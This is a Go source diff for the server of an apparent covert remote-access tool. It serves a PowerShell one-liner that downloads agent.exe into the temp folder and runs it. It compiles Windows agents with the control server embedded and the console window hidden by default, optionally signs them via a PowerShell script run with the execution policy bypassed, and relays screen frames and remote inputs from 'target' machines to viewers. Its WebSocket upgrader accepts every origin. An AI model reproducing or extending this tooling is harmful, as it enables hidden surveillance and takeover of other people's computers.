@@ -7,7 +7,9 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -29,6 +31,8 @@ var (
 	agents   = make(map[string]*AgentSession)
 	agentsMu sync.RWMutex
 
+	buildMu sync.Mutex
+
 	upgrader = websocket.Upgrader{
 		CheckOrigin: func(r *http.Request) bool {
 			return true // Accepter toutes les origines pour le dashboard
@@ -36,9 +40,50 @@ var (
 	}
 )
 
+func findAgentSrc(specifiedDir string) string {
+	candidates := []string{
+		specifiedDir,
+		"./agent",
+		"../agent",
+	}
+	if execPath, err := os.Executable(); err == nil {
+		execDir := filepath.Dir(execPath)
+		candidates = append(candidates,
+			filepath.Join(execDir, "agent"),
+			filepath.Join(execDir, "../agent"),
+			filepath.Join(execDir, "../../agent"),
+		)
+	}
+	for _, c := range candidates {
+		if c == "" {
+			continue
+		}
+		if fi, err := os.Stat(filepath.Join(c, "main.go")); err == nil && !fi.IsDir() {
+			if abs, err := filepath.Abs(c); err == nil {
+				return abs
+			}
+			return c
+		}
+	}
+	return ""
+}
+
+func getCompilerInfo() (bool, string) {
+	goPath, err := exec.LookPath("go")
+	if err != nil {
+		return false, "Compilateur Go ('go') introuvable dans PATH"
+	}
+	out, err := exec.Command(goPath, "version").CombinedOutput()
+	if err != nil {
+		return true, "Go présent"
+	}
+	return true, strings.TrimSpace(string(out))
+}
+
 func main() {
 	port := flag.Int("port", 8080, "Port d'écoute du serveur")
 	binDir := flag.String("bin-dir", "./bin", "Dossier contenant l'agent compilé")
+	agentSrc := flag.String("agent-src", "./agent", "Dossier contenant les sources Go de l'agent")
 	flag.Parse()
 
 	_ = os.MkdirAll(*binDir, 0755)
@@ -57,10 +102,21 @@ func main() {
 
 	// 1.bis Script PowerShell one-liner à télécharger ou exécuter
 	http.HandleFunc("/dl/run.ps1", func(w http.ResponseWriter, r *http.Request) {
-		host := r.Host
-		proto := "https"
-		if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" && !strings.Contains(host, "karpeekrn-uwu.site") {
-			proto = "http"
+		host := r.URL.Query().Get("server")
+		if host == "" {
+			host = r.Host
+		}
+		proto := "http"
+		cleanHost := strings.Split(host, ":")[0]
+		if r.TLS != nil || r.Header.Get("X-Forwarded-Proto") == "https" || strings.Contains(r.Header.Get("CF-Visitor"), "https") {
+			proto = "https"
+		} else if strings.Contains(cleanHost, ".") &&
+			!strings.HasPrefix(cleanHost, "127.") &&
+			!strings.HasPrefix(cleanHost, "192.168.") &&
+			!strings.HasPrefix(cleanHost, "10.") &&
+			!strings.HasPrefix(cleanHost, "172.") &&
+			cleanHost != "localhost" {
+			proto = "https"
 		}
 		script := fmt.Sprintf(`$url = "%s://%s/dl/agent.exe"
 $out = "$env:TEMP\agent.exe"
@@ -83,6 +139,196 @@ Start-Process -FilePath $out -ArgumentList "-server %s" -NoNewWindow
 		}
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(list)
+	})
+
+	// 2.bis API d'information sur le compilateur et l'agent
+	http.HandleFunc("/api/compiler-info", func(w http.ResponseWriter, r *http.Request) {
+		goOk, goVer := getCompilerInfo()
+		srcDir := findAgentSrc(*agentSrc)
+		agentPath := filepath.Join(*binDir, "agent.exe")
+		fi, statErr := os.Stat(agentPath)
+
+		resp := map[string]interface{}{
+			"go_installed":    goOk,
+			"go_version":      goVer,
+			"agent_src_found": srcDir != "",
+			"agent_src_dir":   srcDir,
+			"agent_exists":    statErr == nil,
+			"current_host":    r.Host,
+		}
+		if statErr == nil {
+			resp["agent_size"] = fi.Size()
+			resp["agent_modified"] = fi.ModTime().Format("2006-01-02 15:04:05")
+		}
+
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(resp)
+	})
+
+	// 2.ter API pour compiler une version personnalisée de l'agent
+	http.HandleFunc("/api/compile", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			http.Error(w, "Méthode non autorisée (POST requis)", http.StatusMethodNotAllowed)
+			return
+		}
+
+		type CompileReq struct {
+			Server      string `json:"server"`
+			HideConsole *bool  `json:"hide_console"`
+			Arch        string `json:"arch"`
+		}
+
+		var req CompileReq
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			// Si le body n'est pas du JSON, tester si passé en query
+			req.Server = r.URL.Query().Get("server")
+		}
+
+		serverHost := strings.TrimSpace(req.Server)
+		if serverHost == "" {
+			serverHost = r.Host
+		}
+
+		// Nettoyage de l'adresse saisie
+		serverHost = strings.TrimPrefix(serverHost, "https://")
+		serverHost = strings.TrimPrefix(serverHost, "http://")
+		serverHost = strings.TrimRight(serverHost, "/")
+		serverHost = strings.TrimSpace(serverHost)
+
+		if serverHost == "" {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusBadRequest)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"success": false,
+				"error":   "Nom de domaine ou adresse du serveur invalide/vide.",
+			})
+			return
+		}
+
+		arch := req.Arch
+		if arch == "" {
+			arch = "amd64"
+		}
+
+		hideConsole := true
+		if req.HideConsole != nil {
+			hideConsole = *req.HideConsole
+		}
+
+		buildMu.Lock()
+		defer buildMu.Unlock()
+
+		goPath, err := exec.LookPath("go")
+		if err != nil {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusInternalServerError)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"success": false,
+				"error":   "Compilateur Go ('go') introuvable dans le PATH du serveur.",
+			})
+			return
+		}
+
+		realSrc := findAgentSrc(*agentSrc)
+		if realSrc == "" {
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusInternalServerError)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"success": false,
+				"error":   "Dossier source de l'agent ('agent/main.go') introuvable sur le serveur.",
+			})
+			return
+		}
+
+		_ = os.MkdirAll(*binDir, 0755)
+		tmpExe := filepath.Join(*binDir, fmt.Sprintf("agent_build_%d.exe", time.Now().UnixNano()))
+		targetExe := filepath.Join(*binDir, "agent.exe")
+
+		ldflags := fmt.Sprintf("-X 'main.defaultServer=%s' -s -w", serverHost)
+		if hideConsole {
+			ldflags += " -H=windowsgui"
+		}
+
+		homeDir, _ := os.UserHomeDir()
+		if homeDir == "" {
+			homeDir = "/root"
+		}
+
+		buildCmd := exec.Command(goPath, "build", "-trimpath", "-ldflags", ldflags, "-o", tmpExe, ".")
+		buildCmd.Dir = realSrc
+		buildCmd.Env = append(os.Environ(),
+			"CGO_ENABLED=0",
+			"GOOS=windows",
+			fmt.Sprintf("GOARCH=%s", arch),
+			"HOME="+homeDir,
+			"GOPATH="+filepath.Join(homeDir, "go"),
+			"GOCACHE="+filepath.Join(homeDir, ".cache", "go-build"),
+			"GOMODCACHE="+filepath.Join(homeDir, "go", "pkg", "mod"),
+		)
+
+		log.Printf("[*] Compilation agent en cours pour '%s' (arch: %s, gui: %v)...", serverHost, arch, hideConsole)
+		start := time.Now()
+		output, err := buildCmd.CombinedOutput()
+		elapsed := time.Since(start)
+
+		if err != nil {
+			_ = os.Remove(tmpExe)
+			log.Printf("[-] Échec compilation: %v\n%s", err, string(output))
+			w.Header().Set("Content-Type", "application/json")
+			w.WriteHeader(http.StatusInternalServerError)
+			json.NewEncoder(w).Encode(map[string]interface{}{
+				"success": false,
+				"error":   fmt.Sprintf("Erreur compilation: %v", err),
+				"output":  string(output),
+			})
+			return
+		}
+
+		// Signature si script sign_agent.ps1 disponible et sur Windows
+		if runtime.GOOS == "windows" {
+			signScript := "sign_agent.ps1"
+			if _, statErr := os.Stat(signScript); statErr == nil {
+				_ = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", signScript).Run()
+			}
+		}
+
+		// Remplacement sécurisé du fichier agent.exe
+		_ = os.Remove(targetExe)
+		if err := os.Rename(tmpExe, targetExe); err != nil {
+			// Repli sur copie binaire si rename entre volumes différents ou verrouillé
+			input, rErr := os.ReadFile(tmpExe)
+			if rErr == nil {
+				_ = os.WriteFile(targetExe, input, 0755)
+				_ = os.Remove(tmpExe)
+			} else {
+				w.Header().Set("Content-Type", "application/json")
+				w.WriteHeader(http.StatusInternalServerError)
+				json.NewEncoder(w).Encode(map[string]interface{}{
+					"success": false,
+					"error":   fmt.Sprintf("Erreur remplacement agent.exe: %v", rErr),
+				})
+				return
+			}
+		}
+
+		fi, statErr := os.Stat(targetExe)
+		var size int64 = 0
+		if statErr == nil {
+			size = fi.Size()
+		}
+
+		log.Printf("[+] Agent compilé avec succès en %v (%d octets) pour '%s'", elapsed.Round(time.Millisecond), size, serverHost)
+
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"success":      true,
+			"server":       serverHost,
+			"size":         size,
+			"duration_ms":  elapsed.Milliseconds(),
+			"download_url": fmt.Sprintf("/dl/agent.exe?v=%d", time.Now().Unix()),
+			"build_time":   time.Now().Format("2006-01-02 15:04:05"),
+			"message":      fmt.Sprintf("Agent compilé avec succès pour '%s' (taille: %.2f MB)", serverHost, float64(size)/(1024*1024)),
+		})
 	})
 
 	// 3. WebSocket pour l'Agent (flux vidéo + réception inputs)
@@ -141,10 +387,19 @@ func handleAgentWS(w http.ResponseWriter, r *http.Request) {
 		delete(agents, agentID)
 		agentsMu.Unlock()
 		log.Printf("[-] Machine déconnectée: %s", agentID)
+		notifyAgentDisconnect(agentID)
 	}()
+
+	// Détecte une déconnexion brutale (crash/wifi coupé) sous 6s
+	conn.SetReadDeadline(time.Now().Add(6 * time.Second))
+	conn.SetPongHandler(func(string) error {
+		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
+		return nil
+	})
 
 	// L'agent envoie des frames binaires ou des messages texte (displays info)
 	for {
+		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
 		msgType, data, err := conn.ReadMessage()
 		if err != nil {
 			break
@@ -201,6 +456,24 @@ func broadcastMessage(agentID string, msg []byte) {
 	for conn, viewer := range viewers {
 		if viewer.agentID == agentID {
 			conn.WriteMessage(websocket.TextMessage, msg)
+		}
+	}
+}
+
+func notifyAgentDisconnect(agentID string) {
+	viewersMu.Lock()
+	defer viewersMu.Unlock()
+
+	msg, _ := json.Marshal(map[string]interface{}{
+		"type":     "target_disconnected",
+		"agent_id": agentID,
+	})
+
+	for conn, viewer := range viewers {
+		if viewer.agentID == agentID {
+			_ = conn.WriteMessage(websocket.TextMessage, msg)
+			_ = conn.Close()
+			delete(viewers, conn)
 		}
 	}
 }
